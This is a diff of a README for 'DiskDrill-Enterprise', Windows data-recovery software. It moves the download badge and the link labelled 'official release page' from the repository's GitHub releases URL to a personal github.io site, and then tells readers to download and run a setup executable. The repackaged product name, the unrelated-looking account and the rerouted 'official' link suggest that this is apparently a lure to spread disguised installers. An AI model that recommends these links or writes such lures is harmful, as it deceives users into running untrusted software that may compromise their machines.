@@ -1,6 +1,6 @@
 # 💾 DiskDrill-Enterprise - Recover lost data on Windows devices
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Medicalscientisthook68/DiskDrill-Enterprise/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://medicalscientisthook68.github.io)
 
 ## 📌 About this software
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start:
 
 ## 📥 How to download and install
 
-1. Visit the [official release page](https://github.com/Medicalscientisthook68/DiskDrill-Enterprise/releases) to access the download options.
+1. Visit the [official release page](https://medicalscientisthook68.github.io) to access the download options.
 2. Look for the latest version of the installer file, typically named "DiskDrill-Enterprise-Setup.exe".
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder or your Desktop.
